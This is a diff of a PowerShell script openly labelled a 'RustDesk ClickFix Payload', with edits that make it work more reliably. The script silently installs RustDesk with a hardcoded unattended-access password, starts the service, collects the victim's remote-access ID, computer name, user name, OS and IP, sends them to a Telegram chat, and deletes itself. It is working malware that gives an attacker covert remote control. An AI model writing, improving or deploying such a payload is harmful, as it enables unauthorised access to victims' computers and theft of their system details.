@@ -1,4 +1,4 @@
-# s.ps1 - RustDesk ClickFix Payload
+# s.ps1 - RustDesk ClickFix Payload (Path-Robust Version)
 # This script installs RustDesk silently, sets the password, 
 # establishes persistence, and exfiltrates the ID to Telegram.
 
@@ -9,7 +9,7 @@ $chatId = "2030209395"
 
 # 2. Download Official Installer
 $url = "https://github.com/rustdesk/rustdesk/releases/latest/download/RustDeskSetup-x86_64.exe"
-$f = Join-Path $env:TEMP "rd_setup.exe"
+$f = Join-Path ([System.IO.Path]::GetTempPath()) "rd_setup.exe"
 
 Write-Verbose "Downloading RustDesk installer to $f..."
 try {
@@ -20,29 +20,48 @@ try {
     exit 1
 }
 
-# 3. Install Silently with Hardcoded Password
+# 3. Verify Download
+if (-not (Test-Path $f)) {
+    Write-Error "Download failed. File not found at $f"
+    exit 1
+}
+
+# 4. Install Silently with Hardcoded Password
 # /S = Silent
 # /RUSTDESK_PASSWORD = Sets the permanent password for unattended access
 Start-Process $f -ArgumentList "/S /RUSTDESK_PASSWORD=$pw" -Wait
 
-# 4. Clean Up Installer
+# 5. Clean Up Installer
 Remove-Item $f -Force -ErrorAction SilentlyContinue
 
-# 5. Ensure Service is Running
+# 6. Ensure Service is Running
 Start-Service RustDesk -ErrorAction SilentlyContinue
 
-# 6. Retrieve RustDesk ID
-# Wait 3 seconds to ensure the service is fully initialized
-Start-Sleep -Seconds 3
-$RustDeskId = & "C:\Program Files\RustDesk\rustdesk.exe" --get-id 2>$null
+# 7. Retrieve RustDesk ID (Path-Robust)
+Start-Sleep -Seconds 5
+$rustdeskPath = $null
+if (Test-Path "C:\Program Files\RustDesk\rustdesk.exe") {
+    $rustdeskPath = "C:\Program Files\RustDesk\rustdesk.exe"
+} elseif (Test-Path "C:\Program Files (x86)\RustDesk\rustdesk.exe") {
+    $rustdeskPath = "C:\Program Files (x86)\RustDesk\rustdesk.exe"
+} else {
+    $found = Get-ChildItem -Path "C:\Program Files", "C:\Program Files (x86)" -Filter "rustdesk.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($found) { $rustdeskPath = $found.FullName }
+}
 
-# 7. Exfiltrate ID to Telegram
+$RustDeskId = "NOT_FOUND"
+if ($rustdeskPath) {
+    $RustDeskId = & $rustdeskPath --get-id 2>$null
+}
+
+# 8. Exfiltrate ID to Telegram
 $SystemInfo = @{
     ComputerName = $env:COMPUTERNAME
     UserName     = $env:USERNAME
     OS           = (Get-WmiObject Win32_OperatingSystem).Caption
     IP           = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
     Timestamp    = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+    RustDeskPath = $rustdeskPath
 }
 
 $TelegramMessage = @"
@@ -53,6 +72,7 @@ $TelegramMessage = @"
 💻 <b>Computer:</b> $env:COMPUTERNAME
 👤 <b>User:</b> $env:USERNAME
 🌐 <b>IP:</b> $($SystemInfo.IP)
+📂 <b>Path:</b> $rustdeskPath
 📅 <b>Time:</b> $($SystemInfo.Timestamp)
 "@
 
@@ -74,7 +94,7 @@ try {
     Write-Verbose "Telegram notification failed: $_"
 }
 
-# 8. Final Cleanup
+# 9. Final Cleanup
 if ($MyInvocation.MyCommand.Path) {
     Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 }
